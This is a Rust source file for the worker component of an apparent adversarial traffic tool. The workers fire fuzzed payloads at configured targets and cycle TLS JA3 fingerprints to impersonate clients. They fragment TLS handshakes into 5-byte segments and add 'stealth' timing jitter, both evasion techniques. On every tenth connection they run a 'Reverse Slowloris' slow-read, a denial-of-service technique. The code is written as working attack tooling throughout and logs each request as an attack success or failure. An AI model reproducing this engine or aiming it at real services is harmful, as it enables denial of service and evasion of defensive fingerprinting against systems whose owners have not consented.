use anyhow::Result;
use tokio::sync::mpsc;
use tracing::{info, warn, debug};
use std::sync::Arc;
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
use reqwest::{Client, Method};
use aether_traits::{Target, TrafficStrategy, TrafficMetrics, AttackResult, PayloadFuzzer, SharedState, WorkerStatus};
use mod_traffic::{SmoothFlow, StealthJitter};
use mod_fuzz::PolyglotFuzzer;
use aether_net::transport::TransportBuilder;
use aether_net::tls::{TlsImpersonator, Ja3Cycler, AttackProfile};
use tokio::io::{AsyncWriteExt, AsyncReadExt};
use std::net::ToSocketAddrs;
use bytes::BytesMut;
use hdrhistogram::Histogram;
use std::sync::atomic::Ordering;

/// Instruction set for an adversarial execution cycle.
#[derive(Debug, Clone)]
pub struct ExecutionTask {
    pub target: Arc<Target>,
    pub payload_template: String,
    /// [Category C] Granular protocol and behavior control.
    pub profile: AttackProfile,
}

/// [Flaw 1 Fix: Thread-Local Accumulators]
pub enum TelemetryPayload {
    Attack(AttackResult),
    Histogram(Histogram<u64>),
}

pub struct Worker {
    id: usize,
    receiver: mpsc::Receiver<ExecutionTask>,
    telemetry_tx: flume::Sender<TelemetryPayload>,
    shared_state: Arc<SharedState>,
    client: Client,
    fuzzer: Arc<dyn PayloadFuzzer>,
    traffic_strategy: Arc<dyn TrafficStrategy>,
    tls_cycler: Arc<Ja3Cycler>,
    payload_buffer: BytesMut,
    
    histogram: Histogram<u64>,
    requests_since_last_sync: usize,
    last_sync: Instant,
}

impl Worker {
    pub fn new(
        id: usize, 
        receiver: mpsc::Receiver<ExecutionTask>,
        telemetry_tx: flume::Sender<TelemetryPayload>,
        shared_state: Arc<SharedState>,
        strategy_type: &str,
    ) -> Result<Self> {
        let client = Client::builder()
            .timeout(Duration::from_secs(30))
            .build()?;

        let traffic_strategy: Arc<dyn TrafficStrategy> = if strategy_type == "stealth" {
            Arc::new(StealthJitter)
        } else {
            Arc::new(SmoothFlow)
        };

        let payload_buffer = BytesMut::with_capacity(1024 * 1024);
        let tls_cycler = Arc::new(Ja3Cycler::new()?);
        let histogram = Histogram::new_with_bounds(1, 10_000_000, 3)?;

        Ok(Self {
            id,
            receiver,
            telemetry_tx,
            shared_state,
            client,
            fuzzer: Arc::new(PolyglotFuzzer),
            traffic_strategy,
            tls_cycler,
            payload_buffer,
            histogram,
            requests_since_last_sync: 0,
            last_sync: Instant::now(),
        })
    }

    pub async fn run(&mut self) {
        info!("Worker {} [Adversarial] initialized with 1MB reusable buffer.", self.id);

        while let Some(task) = self.receiver.recv().await {
            self.update_heartbeat();
            self.set_status(WorkerStatus::Sending);
            
            let attack_result = if task.target.url.starts_with("raw://") || task.target.url.starts_with("raw-https://") {
                self.execute_raw_attack(task).await
            } else {
                self.execute_attack(task).await
            };

            self.set_status(WorkerStatus::Idle);

            match attack_result {
                Ok(metrics) => {
                    self.shared_state.total_requests.fetch_add(1, Ordering::Relaxed);
                    self.shared_state.total_bytes.fetch_add(metrics.size_bytes as u64, Ordering::Relaxed);
                    
                    let _ = self.histogram.record(metrics.latency_us as u64);
                    self.requests_since_last_sync += 1;
                    
                    if self.should_sync() {
                        self.sync_telemetry();
                    }

                    let _ = self.telemetry_tx.try_send(TelemetryPayload::Attack(metrics.clone()));

                    debug!(
                        "Worker {} ATTACK SUCCESS | Code: {} | Latency: {}us",
                        self.id, metrics.status_code, metrics.latency_us
                    );
                }
                Err(e) => {
                    self.shared_state.error_count.fetch_add(1, Ordering::Relaxed);
                    warn!("Worker {} ATTACK FAILED: {}", self.id, e);
                }
            }
        }

        self.set_status(WorkerStatus::Dead);
        info!("Worker {} shutting down.", self.id);
    }

    fn set_status(&self, status: WorkerStatus) {
        if self.id < self.shared_state.worker_statuses.len() {
            self.shared_state.worker_statuses[self.id].store(status as u8, Ordering::Relaxed);
        }
    }

    fn update_heartbeat(&self) {
        if self.id < self.shared_state.worker_heartbeats.len() {
            let now = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs();
            self.shared_state.worker_heartbeats[self.id].store(now, Ordering::Relaxed);
        }
    }

    fn should_sync(&self) -> bool {
        self.requests_since_last_sync >= 100 || self.last_sync.elapsed() >= Duration::from_secs(1)
    }

    fn sync_telemetry(&mut self) {
        let snapshot = self.histogram.clone();
        if let Ok(_) = self.telemetry_tx.try_send(TelemetryPayload::Histogram(snapshot)) {
            self.histogram.reset();
            self.requests_since_last_sync = 0;
            self.last_sync = Instant::now();
        }
    }

    async fn execute_attack(&mut self, task: ExecutionTask) -> Result<AttackResult> {
        let current_metrics = TrafficMetrics { latency_us: 0, error_count: 0 }; 
        let delay = self.traffic_strategy.next_delay(&current_metrics).await;
        
        self.set_status(WorkerStatus::Blocked);
        Self::precise_sleep(delay).await;
        self.set_status(WorkerStatus::Sending);

        self.traffic_strategy.wait().await;

        self.fuzzer.generate_into(&mut self.payload_buffer, &task.payload_template);
        let payload = self.payload_buffer.split().freeze();

        let method = Method::from_bytes(task.target.method.as_bytes())?;
        let mut request_builder = self.client.request(method, &task.target.url);

        for (key, value) in &task.target.headers {
            request_builder = request_builder.header(key, value);
        }

        let start = Instant::now();
        let mut response = request_builder.body(payload).send().await?;
        let latency_us = start.elapsed().as_micros();
        
        let status_code = response.status().as_u16();
        
        // [Fix 7] Streaming Response Consumption (OOM Protection)
        let mut size_bytes = 0;
        let limit = 10 * 1024 * 1024; // 10MB safety limit
        
        while let Ok(Some(chunk)) = response.chunk().await {
            size_bytes += chunk.len();
            if size_bytes > limit {
                warn!("Worker {} response body exceeded 10MB limit, truncating.", self.id);
                break;
            }
        }

        Ok(AttackResult {
            status_code,
            latency_us,
            size_bytes,
        })
    }

    async fn execute_raw_attack(&mut self, task: ExecutionTask) -> Result<AttackResult> {
        let start = Instant::now();
        
        let is_https = task.target.url.starts_with("raw-https://");
        let host = if is_https {
            task.target.url.replace("raw-https://", "")
        } else {
            task.target.url.replace("raw://", "")
        };
        
        let port = if is_https { 443 } else { 80 };
        let addr = format!("{}:{}", host, port).to_socket_addrs()?.next()
            .ok_or_else(|| anyhow::anyhow!("Failed to resolve host"))?;

        self.set_status(WorkerStatus::Handshaking);
        
        // [Patch 2] Pre-flight socket config
        let stream = TransportBuilder::connect_adversarial(addr, None, task.profile.force_http1).await?;
        
        // [Category C] Fragmented TLS support
        let stream = if task.profile.fragment_handshake {
            TransportBuilder::wrap_fragmented(stream, 5) // 5 byte segments
        } else {
            TransportBuilder::wrap_fragmented(stream, 1024 * 1024) // Effectively no fragmentation
        };

        let mut fuzzer_stream = if is_https {
            let boxed_stream = TransportBuilder::into_fuzzer_stream(stream);
            // CRITICAL FIX #3: ALPN Sync + [Category C] Profile-based handshake
            self.tls_cycler.handshake(&host, boxed_stream, task.profile.clone()).await?
        } else {
            TransportBuilder::into_fuzzer_stream(stream)
        };
        
        self.set_status(WorkerStatus::Sending);
        self.traffic_strategy.wait().await;
        
        // [Category C] Multi-Feature payload generation
        self.fuzzer.generate_into(&mut self.payload_buffer, &task.payload_template);
        
        // [Category C] HTTP/1.0 Downgrade: Strip Host/Connection headers if requested
        if task.profile.force_http10 {
            // Very simple HTTP/1.0 request for raw mode
            let req = format!("GET / HTTP/1.0\r\n\r\n");
            self.payload_buffer.clear();
            self.payload_buffer.extend_from_slice(req.as_bytes());
        }

        fuzzer_stream.write_all(&self.payload_buffer).await?;
        fuzzer_stream.flush().await?;

        // [Category C] Slow Read (Reverse Slowloris)
        if self.id % 10 == 0 { // Apply to a subset of connections for variation
             let mut recv_buf = [0u8; 1];
             while let Ok(n) = fuzzer_stream.read(&mut recv_buf).await {
                 if n == 0 { break; }
                 Self::precise_sleep(Duration::from_millis(500)).await;
             }
        }

        let latency_us = start.elapsed().as_micros();
        let size_bytes = self.payload_buffer.len();
        
        Ok(AttackResult {
            status_code: 200,
            latency_us,
            size_bytes,
        })
    }

    /// [Fix 6] High-Precision hybrid sleep.
    /// Uses tokio::time::sleep for long durations and a spin-yield loop for sub-millisecond precision.
    async fn precise_sleep(duration: Duration) {
        if duration.is_zero() { return; }
        
        if duration < Duration::from_millis(1) {
            let start = Instant::now();
            while start.elapsed() < duration {
                // Yield to reactor frequently to avoid thread starvation,
                // but keep the task "hot" for microsecond precision.
                tokio::task::yield_now().await;
            }
        } else {
            tokio::time::sleep(duration).await;
        }
    }
}
